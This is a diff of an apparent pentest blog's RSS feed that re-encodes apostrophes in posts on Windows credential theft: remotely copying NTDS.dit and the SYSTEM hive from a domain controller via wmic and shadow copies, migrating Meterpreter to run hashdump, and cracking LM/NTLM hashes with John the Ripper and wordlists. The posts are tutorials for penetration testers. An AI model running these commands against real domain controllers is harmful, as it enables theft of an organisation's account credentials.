@@ -118,7 +118,7 @@ Extracting schema information - 100% -&amp;gt; &lt;span style=&#34;color:#ae81ff
 Extracting object links...
 
 List of users:
-&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;==============&lt;/span&gt;
 
 Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3562&lt;/span&gt;
 User name:           Administrator
@@ -291,13 +291,13 @@ root@wpad:~/blog/NTDSXtract 1.0#
       <description>&lt;blockquote&gt;
 &lt;p&gt;This and part 2 are mostly just an update to &lt;a href=&#34;http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html&#34;&gt;http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html&lt;/a&gt; but without the need for VSSOwn, that and we are doing it remotely without the need for shell on the DC.&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;Ever run into a Domain Controller that wasn&#39;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start&lt;/p&gt;
+&lt;p&gt;Ever run into a Domain Controller that wasn&amp;rsquo;t allowed to talk to the Internet, had insane AV and GPOs not allowing anyone to RDP in (Even Domain Admins) unless they provided some kind of voodo happy dance? Ya me neither, but here is how you can still dump domain hashes and hash history if you run into that case. Lets start&lt;/p&gt;
 &lt;p&gt;First authenticate to the domain controller and make sure you have a good working directory to use.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;net use \\DC1 /user:DOMAIN\domainadminsvc domainadminsvc123
 dir \\DC1\C$
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Alright, lets say &amp;ldquo;TEMP&amp;rdquo; is there and it&#39;s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in &lt;code&gt;C:\TEMP&lt;/code&gt; where we already made sure is clear.&lt;/p&gt;
-&lt;p&gt;We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory&#39;s DB much like Window&#39;s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.&lt;/p&gt;
-&lt;p&gt;So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you&#39;ve installed wmic for Linux via &lt;a href=&#34;http://www.krenger.ch/blog/wmi-commands-from-linux/&#34;&gt;http://www.krenger.ch/blog/wmi-commands-from-linux/&lt;/a&gt; ) - this &lt;em&gt;IS&lt;/em&gt; an interactive command so this won&#39;t work very nicely in a Meterpreter shell:&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Alright, lets say &amp;ldquo;TEMP&amp;rdquo; is there and it&amp;rsquo;s empty on the remote DC. The way we are going to run commands will not allow us to get results directly so we are going to use a temp file on the DC in &lt;code&gt;C:\TEMP&lt;/code&gt; where we already made sure is clear.&lt;/p&gt;
+&lt;p&gt;We are going to be using Volume Shadow Copies to pull the NTDS.dit file (Active Directory&amp;rsquo;s DB much like Window&amp;rsquo;s SAM file except that it stores the entire AD set of objects there), we also need the SYSTEM registry hive. You can get the SAM registry hive as well but that will only get local DC credentials.&lt;/p&gt;
+&lt;p&gt;So lets list the current volume shadow copies to see if we need to create one, from a Windows command prompt (or if you&amp;rsquo;ve installed wmic for Linux via &lt;a href=&#34;http://www.krenger.ch/blog/wmi-commands-from-linux/&#34;&gt;http://www.krenger.ch/blog/wmi-commands-from-linux/&lt;/a&gt; ) - this &lt;em&gt;IS&lt;/em&gt; an interactive command so this won&amp;rsquo;t work very nicely in a Meterpreter shell:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c vssadmin list shadows 2&amp;gt;&amp;amp;1 &amp;gt; C:\tempoutput.txt&amp;quot;
 Executing (Win32_Process)-&amp;gt;Create()
 Method execution successful.
@@ -312,7 +312,7 @@ instance of __PARAMETERS
 &lt;li&gt;&lt;code&gt;wmic /node:DC1&lt;/code&gt; - tells it to interact with the WMI API on DC1&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;/user:DOMAIN\domainadminsvc /password:domainadminsvc123&lt;/code&gt; - authentication&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;process call create&lt;/code&gt; - WMI speak for create a process&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;cmd /c&lt;/code&gt; - vssadmin doesn&#39;t operate outside of cmd for some reason&amp;hellip;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cmd /c&lt;/code&gt; - vssadmin doesn&amp;rsquo;t operate outside of cmd for some reason&amp;hellip;&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;vssadmin list shadows&lt;/code&gt; - List any shadow volumes that already exist&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&lt;/code&gt; - Take STDIN and STDERROR and throw it in a text file on DC1 C:\TEMP. Make sure you specify full path because you will be executing from within C:\Windows\System32 and its a pain to find anything in that directory. So if you just specify &amp;gt; bob.txt you get to hunt in C:\Windows\System32 or wherever WMI wants to execute you from for bob.txt&lt;/li&gt;
 &lt;/ul&gt;
@@ -337,17 +337,17 @@ vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
 (C) Copyright 2001-2005 Microsoft Corp.
 
 No items found that satisfy the query
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &amp;lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don&#39;t have to remember this):&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If there are no shadow copies or the ones there are too old (look at the creation time), you can create a shadow copy using the &amp;lsquo;vssadmin create shadow /for=C: command. (This command only applies to Server OS (Win2k3/Win2k8) but since those are the only two that commonly have NTDS.dit files we don&amp;rsquo;t have to remember this):&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c vssadmin create shadow /for=C: 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The other thing to keep in mind is that NTDS.dit isn&#39;t always on the main drive. It is commonly on a &amp;ldquo;D&amp;rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The other thing to keep in mind is that NTDS.dit isn&amp;rsquo;t always on the main drive. It is commonly on a &amp;ldquo;D&amp;rdquo; drive for safety if a HDD goes bad or something. But it should always be in a folder called NTDS. (By default this is C:WindowsNTDS)&lt;/p&gt;
 &lt;p&gt;Next we just copy the files out of the shadow copies. First the SYSTEM hive:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM.hive 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then the NTDS.dit (notice this one isn&#39;t in System32):&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then the NTDS.dit (notice this one isn&amp;rsquo;t in System32):&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create &amp;quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt&amp;quot;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In Kali Linux you could use the WMIS package to do much the same thing:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //DC1 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2&amp;gt;&amp;amp;1 &amp;gt; C:\temp\output.txt
 NTSTATUS: NT_STATUS_OK - Success
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Copy those files to your own system for offline extraction which I&#39;ll cover in part 2.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Copy those files to your own system for offline extraction which I&amp;rsquo;ll cover in part 2.&lt;/p&gt;
 </description>
     </item>
     
@@ -357,9 +357,9 @@ NTSTATUS: NT_STATUS_OK - Success
       <pubDate>Mon, 18 Mar 2013 20:01:44 +0000</pubDate>
       
       <guid>https://malicious.link/post/2013/2013-03-18-length-sorting-wordlists/</guid>
-      <description>&lt;p&gt;This is one of those stupid simple things that are easy to forget so I&#39;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&#39;t have to, but there is times where it&#39;s important.&lt;/p&gt;
-&lt;p&gt;Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&#39;s sorted and usually is best to sort them by most common first so you get earlier hits. However, if you start throwing rules into the mix that equation changes. If you have &amp;ldquo;iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&amp;rdquo; on the 3rd line of your dictionary, testing every possible permutation where you replace an &amp;lsquo;i&amp;rsquo; with a 1 is going to take a very long time.&lt;/p&gt;
-&lt;p&gt;Both Hashcat and John deal with this by limiting the length where permutations occur. (HC/JTR peeps please correct me if I&#39;m wrong). Cain on the other hand, will try every possibility and hang on the 3rd line for years (over exagerated). How do you solve that? Easy, remove any word over a certain length. While that does work, and very similar to what the HC/JTR do, I don&#39;t like loosing words from my dictionary, so I tend to sort them by length. That way, all the nasty ones are near the end and I can scale back the rules on them.&lt;/p&gt;
+      <description>&lt;p&gt;This is one of those stupid simple things that are easy to forget so I&amp;rsquo;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&amp;rsquo;t have to, but there is times where it&amp;rsquo;s important.&lt;/p&gt;
+&lt;p&gt;Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&amp;rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits. However, if you start throwing rules into the mix that equation changes. If you have &amp;ldquo;iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&amp;rdquo; on the 3rd line of your dictionary, testing every possible permutation where you replace an &amp;lsquo;i&amp;rsquo; with a 1 is going to take a very long time.&lt;/p&gt;
+&lt;p&gt;Both Hashcat and John deal with this by limiting the length where permutations occur. (HC/JTR peeps please correct me if I&amp;rsquo;m wrong). Cain on the other hand, will try every possibility and hang on the 3rd line for years (over exagerated). How do you solve that? Easy, remove any word over a certain length. While that does work, and very similar to what the HC/JTR do, I don&amp;rsquo;t like loosing words from my dictionary, so I tend to sort them by length. That way, all the nasty ones are near the end and I can scale back the rules on them.&lt;/p&gt;
 &lt;p&gt;To do that is very simple:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;awk &#39;{print length, $0}&#39; rockyou.txt | sort -n | cut -d &amp;quot; &amp;quot; -f2- &amp;gt; rockyou_ls.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thats it. Basic, simple and stored here for reference.&lt;/p&gt;
@@ -387,22 +387,22 @@ NTSTATUS: NT_STATUS_OK - Success
       <pubDate>Wed, 24 Oct 2012 15:03:58 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-10-24-lm2ntlm-with-john-the-ripper/</guid>
-      <description>&lt;p&gt;Since I didn&#39;t see any documentation bringing how to take an LM hash that you&#39;ve cracked and convert it to the NTLM equivalent all in one place. And I google how to do it almost every time. I wanted to put all these links in one place and remember how to do it for john. Go-go-gadget blog-notes.&lt;/p&gt;
+      <description>&lt;p&gt;Since I didn&amp;rsquo;t see any documentation bringing how to take an LM hash that you&amp;rsquo;ve cracked and convert it to the NTLM equivalent all in one place. And I google how to do it almost every time. I wanted to put all these links in one place and remember how to do it for john. Go-go-gadget blog-notes.&lt;/p&gt;
 &lt;p&gt;So there is this: &lt;a href=&#34;https://github.com/snarez/rcracki/blob/master/lm2ntlm.cpp&#34;&gt;https://github.com/snarez/rcracki/blob/master/lm2ntlm.cpp&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;And this: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/tools/lm2ntcrack.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/tools/lm2ntcrack.rb&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;And this: &lt;a href=&#34;http://www.securityfocus.com/tools/6696&#34;&gt;http://www.securityfocus.com/tools/6696&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;And the edited version of the above: &lt;a href=&#34;http://atenlabs.com/blog/so-you-pillaged-a-domain-controllers-hashes/&#34;&gt;http://atenlabs.com/blog/so-you-pillaged-a-domain-controllers-hashes/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;But Metasploit&#39;s is currently &lt;a href=&#34;http://dev.metasploit.com/redmine/issues/7351&#34;&gt;borked&lt;/a&gt;,(&lt;strong&gt;Update: this is now fixed&lt;/strong&gt;) I don&#39;t want to compile cpp, and perl sucks. One thing I did find was that someone submitted it to the JtR dev mailing list here:&lt;/p&gt;
+&lt;p&gt;But Metasploit&amp;rsquo;s is currently &lt;a href=&#34;http://dev.metasploit.com/redmine/issues/7351&#34;&gt;borked&lt;/a&gt;,(&lt;strong&gt;Update: this is now fixed&lt;/strong&gt;) I don&amp;rsquo;t want to compile cpp, and perl sucks. One thing I did find was that someone submitted it to the JtR dev mailing list here:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2011/03/29/7&#34;&gt;http://www.openwall.com/lists/john-dev/2011/03/29/7&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;And I asked on that same list what had become of it:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://www.openwall.com/lists/john-dev/2012/10/24/2&#34;&gt;http://www.openwall.com/lists/john-dev/2012/10/24/2&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;The result is as follows:&lt;/p&gt;
 &lt;p&gt;Given this hash:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;Administrator:500:AA1AB12D9BE8C0D18F900ABF62624751:A2855453E8F6E555E5F22956F7DAA398:::
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;which is the LM and NTLM equiv of SUPERPASSWORD/SuPerPaSsWord respectively. So just so I don&#39;t have to make a screen shot of a text file assume that hash exactly as-is is in pwdump.txt.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;which is the LM and NTLM equiv of SUPERPASSWORD/SuPerPaSsWord respectively. So just so I don&amp;rsquo;t have to make a screen shot of a text file assume that hash exactly as-is is in pwdump.txt.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_lm2ntlm_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;cracked the LM side in 16 seconds. Now you don&#39;t need to use John to get the LM side (rainbow tables work better at times),&lt;/p&gt;
-&lt;p&gt;Solar Designer (JtR&#39;s main dev) suggested the following path:&lt;/p&gt;
+&lt;p&gt;cracked the LM side in 16 seconds. Now you don&amp;rsquo;t need to use John to get the LM side (rainbow tables work better at times),&lt;/p&gt;
+&lt;p&gt;Solar Designer (JtR&amp;rsquo;s main dev) suggested the following path:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201210_lm2ntlm_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;A bit hard to read but here are the commands:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;./john -show pwdump.txt | cut -d: -f2 &amp;gt; cracked      
@@ -420,9 +420,9 @@ NTSTATUS: NT_STATUS_OK - Success
       <pubDate>Mon, 12 Sep 2011 08:09:46 +0000</pubDate>
       
       <guid>https://malicious.link/post/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/</guid>
-      <description>&lt;p&gt;John the ripper only takes one word list at a time. There are plenty of docs out there that show you how to cat all of your dictionaries into John&#39;s stdin function but I like to run rules against my lists and I didn&#39;t see any how-tos on doing this. Here is my way:&lt;/p&gt;
+      <description>&lt;p&gt;John the ripper only takes one word list at a time. There are plenty of docs out there that show you how to cat all of your dictionaries into John&amp;rsquo;s stdin function but I like to run rules against my lists and I didn&amp;rsquo;t see any how-tos on doing this. Here is my way:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;ls dicts | xargs -t -I file ./john --pot=victim.pot --format=mscash --wordlist=dicts/file --rules victim_cachedump.txt&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;This command will ls the &amp;lsquo;dicts&amp;rsquo; directory, pipe it to xargs, which will spit out the command it uses for each itteration (-t) and replace every time it see the word file with the line/itteration its on (-I). Then it&#39;s just your standard john arguments.&lt;/p&gt;
+&lt;p&gt;This command will ls the &amp;lsquo;dicts&amp;rsquo; directory, pipe it to xargs, which will spit out the command it uses for each itteration (-t) and replace every time it see the word file with the line/itteration its on (-I). Then it&amp;rsquo;s just your standard john arguments.&lt;/p&gt;
 </description>
     </item>
     
@@ -432,17 +432,17 @@ NTSTATUS: NT_STATUS_OK - Success
       <pubDate>Wed, 13 Jul 2011 14:02:13 +0000</pubDate>
       
       <guid>https://malicious.link/post/2011/2011-07-13-gpu-cracking-complaints/</guid>
-      <description>&lt;p&gt;I&#39;ve been cracking passwords for a while and use a myriad of tools in a certain order to get the job done. I find that Cain is still my Go-to for allowing me to visualize the process and do some basic sorting (really wish I could search in-app). But I&#39;ve been asking around on twitter some questions like Why is GPU cracking for 50k hashes faster than Rainbow Tables (most say the bottleneck is the HDD read style and speed) and many asked what all of my compalints are so I figured this would be the best place (vice multiple emails)&lt;/p&gt;
+      <description>&lt;p&gt;I&amp;rsquo;ve been cracking passwords for a while and use a myriad of tools in a certain order to get the job done. I find that Cain is still my Go-to for allowing me to visualize the process and do some basic sorting (really wish I could search in-app). But I&amp;rsquo;ve been asking around on twitter some questions like Why is GPU cracking for 50k hashes faster than Rainbow Tables (most say the bottleneck is the HDD read style and speed) and many asked what all of my compalints are so I figured this would be the best place (vice multiple emails)&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;DISCLAIMER&lt;/strong&gt;: I have very little crypto knowledge and even less GPU programming knowledge so I only get to complain as a user and not as someone who can actually fix the things I complain about.&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;Lack of LM support. I get that this is a complicated hashing algorithm, but the fact that 90% of companies still have it turned on and cracking any more than a few with Rainbow Tables is impractical unless you have a SSD raid with a GPU based cracker ($$$$$).&lt;/li&gt;
-&lt;li&gt;Lack of dictionary support. Right now the best way to crack passwords is with oclhashcat-plus since it is GPU based and supports rules, multiple hashes (hash files) and directories of hashes. However, it has a very limited list of hashes it supports (No LM, SHA1, etc..) and it doesn&#39;t support dump formats, so you need to strip the file so it just has the hash (this is more of just a bother than a gripe).
+&lt;li&gt;Lack of dictionary support. Right now the best way to crack passwords is with oclhashcat-plus since it is GPU based and supports rules, multiple hashes (hash files) and directories of hashes. However, it has a very limited list of hashes it supports (No LM, SHA1, etc..) and it doesn&amp;rsquo;t support dump formats, so you need to strip the file so it just has the hash (this is more of just a bother than a gripe).
 &lt;ul&gt;
 &lt;li&gt;I say &amp;lsquo;The best way&amp;rsquo; because anything that has a key space larger than upper-alpha-numeric-32symbol (LM) is just a bit nuts to try and brute force out of the gate unless your goal is to &amp;lsquo;crack them all&amp;rsquo;. Me as a pentester, I want to get as many as possible, as quick as possible, so this means dictionaries are the smarter option. (Maybe later I can do the straight brute if I really need / want to)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Lack of POT. For some reason every cracking app on the planet, save for JtR, thinks it&#39;s a good idea to crack the same hash multiple times. I wish even Cain would keep a secret store of all the hashes it&#39;s cracked stripped of anything unimportant (need the salt (username) sometimes) and store it in the background so that if it comes across the same hash it can say &amp;ldquo;oo oo I know this one&amp;rdquo; and auto populate it even before I start cracking. Why more cracking software writers don&#39;t do this I&#39;ll never know (would make their software seem a ton faster the more it is used)&lt;/li&gt;
-&lt;li&gt;Lack of formatting documentation (#ripshairout). Rare is the time I&#39;ve found a cracking program that shows you how it wants to consume a hash. JtR is the most egregious offenders of this but they all do it. One would think people would try and make it easy for people to use their software (give examples of what shit is supposed to look like at least if you don&#39;t support standard formats)&lt;/li&gt;
+&lt;li&gt;Lack of POT. For some reason every cracking app on the planet, save for JtR, thinks it&amp;rsquo;s a good idea to crack the same hash multiple times. I wish even Cain would keep a secret store of all the hashes it&amp;rsquo;s cracked stripped of anything unimportant (need the salt (username) sometimes) and store it in the background so that if it comes across the same hash it can say &amp;ldquo;oo oo I know this one&amp;rdquo; and auto populate it even before I start cracking. Why more cracking software writers don&amp;rsquo;t do this I&amp;rsquo;ll never know (would make their software seem a ton faster the more it is used)&lt;/li&gt;
+&lt;li&gt;Lack of formatting documentation (#ripshairout). Rare is the time I&amp;rsquo;ve found a cracking program that shows you how it wants to consume a hash. JtR is the most egregious offenders of this but they all do it. One would think people would try and make it easy for people to use their software (give examples of what shit is supposed to look like at least if you don&amp;rsquo;t support standard formats)&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Those are my biggest gripes that the moment. If I am wrong on any account, let me know, I would love to know of a better way to do things.&lt;/p&gt;
 </description>
@@ -454,7 +454,7 @@ NTSTATUS: NT_STATUS_OK - Success
       <pubDate>Mon, 16 May 2011 02:35:31 +0000</pubDate>
       
       <guid>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</guid>
-      <description>&lt;p&gt;When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&#39;ve had to fall back on dropping binaries which I really don&#39;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&#39;ll be back to passing the hash. Here is how, with a bit of the thought process first:&lt;/p&gt;
+      <description>&lt;p&gt;When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;                ##                          ###           ##    ##
  ##  ##  #### ###### ####  #####   #####    ##    ####        ######
 ####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
@@ -548,7 +548,7 @@ Current pid: 2992
 
 meterpreter &amp;gt; hashdump
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ah, the wonderful &amp;lsquo;The parameter is incorrect&amp;rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&#39;t the issue, but lets do a &amp;lsquo;getprivs&amp;rsquo; just in case:&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ah, the wonderful &amp;lsquo;The parameter is incorrect&amp;rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&amp;rsquo;t the issue, but lets do a &amp;lsquo;getprivs&amp;rsquo; just in case:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getprivs    
 ============================================================
 Enabled Process Privileges
@@ -608,7 +608,7 @@ jane.user??:1105:MYLMHASH:MYNTLMHASH:::
 DOMAINCONTROLLE$?:1001:MYLMHASH:MYNTLMHASH:::
 
 meterpreter &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;w00t. So I don&#39;t know why, but it seems that you have to be in a &amp;lsquo;SYSTEM&amp;rsquo; process who&#39;s primary token (started by SYSTEM) is SYSTEM (since &amp;lsquo;getsystem&amp;rsquo; wasn&#39;t working). I also tried this getting SYSTEM to run a 32 bit process, and was still unable to dump hashes. So next time you&#39;re on an Win2k8 R2 64 bit box, remember to migrate into a pre-existing 64bit SYSTEM process and you should be good to go.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;w00t. So I don&amp;rsquo;t know why, but it seems that you have to be in a &amp;lsquo;SYSTEM&amp;rsquo; process who&amp;rsquo;s primary token (started by SYSTEM) is SYSTEM (since &amp;lsquo;getsystem&amp;rsquo; wasn&amp;rsquo;t working). I also tried this getting SYSTEM to run a 32 bit process, and was still unable to dump hashes. So next time you&amp;rsquo;re on an Win2k8 R2 64 bit box, remember to migrate into a pre-existing 64bit SYSTEM process and you should be good to go.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-05-15 23:39 by Rob Fuller&lt;/p&gt;
 &lt;p&gt;As Gavin points out in the comments, it is better to run the meterpreter script or post module to do hashdumping on systems. The only time this is not the case is when you are trying to get domain hashes on a domain controller. The registry does not store these hashes (as far as I know). So LSASS injection is the only route and you have to jump through the mentioned hoops.&lt;/p&gt;
 </description>
@@ -620,7 +620,7 @@ meterpreter &amp;gt;
       <pubDate>Fri, 18 Sep 2009 14:41:16 +0000</pubDate>
       
       <guid>https://malicious.link/post/2009/2009-09-18-password-word-lists/</guid>
-      <description>&lt;p&gt;Brute force, even though it&#39;s gotten so fast, is still a long way away from cracking long complex passwords. That&#39;s were word lists come in handy. It&#39;s usually the crackers first go-to solution, slam a word list against the hash, if that doesn&#39;t work, try rainbow tables (if they happen to have the tables for that specific hash type), and then the full on brute force. Some would say those first two steps are reversed, and it really is the choice of the the person doing it and the word lists they have to work with.&lt;/p&gt;
+      <description>&lt;p&gt;Brute force, even though it&amp;rsquo;s gotten so fast, is still a long way away from cracking long complex passwords. That&amp;rsquo;s were word lists come in handy. It&amp;rsquo;s usually the crackers first go-to solution, slam a word list against the hash, if that doesn&amp;rsquo;t work, try rainbow tables (if they happen to have the tables for that specific hash type), and then the full on brute force. Some would say those first two steps are reversed, and it really is the choice of the the person doing it and the word lists they have to work with.&lt;/p&gt;
 &lt;p&gt;Matt Weir and company created a cool tool that has the best of both worlds, Dictionary based Rainbow Tables with Dr-Crack, which you can find here:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;http://reusablesec.googlepages.com/drcrack&#34;&gt;http://reusablesec.googlepages.com/drcrack&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;But, back to the reason of this post, word lists. Where do you get them? Here are a couple of my favorite places in no particular order:&lt;/p&gt;
@@ -630,8 +630,8 @@ meterpreter &amp;gt;
 &lt;a href=&#34;http://www.outpost9.com/files/WordLists.html&#34;&gt;http://www.outpost9.com/files/WordLists.html&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;I like to keep 3 size word lists:&lt;/p&gt;
 &lt;ol&gt;
-&lt;li&gt;small and fast: usually based on the output of one of the tools i&#39;m about to tell you about&lt;/li&gt;
-&lt;li&gt;medium: this is my custom list that I add passwords I find / crack and generally think are good to add. I&#39;m pretty picky about what goes into this list&lt;/li&gt;
+&lt;li&gt;small and fast: usually based on the output of one of the tools i&amp;rsquo;m about to tell you about&lt;/li&gt;
+&lt;li&gt;medium: this is my custom list that I add passwords I find / crack and generally think are good to add. I&amp;rsquo;m pretty picky about what goes into this list&lt;/li&gt;
 &lt;li&gt;huge: any wordlist I come across gets added to this list, it gets sorted and uniqued and restored&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Now the two tools that I like for the small list is are CeWL and wyd&lt;/p&gt;
@@ -639,8 +639,8 @@ meterpreter &amp;gt;
 Wyd - &lt;a href=&#34;http://www.remote-exploit.org/codes_wyd.html&#34;&gt;http://www.remote-exploit.org/codes_wyd.html&lt;/a&gt;&lt;/p&gt;
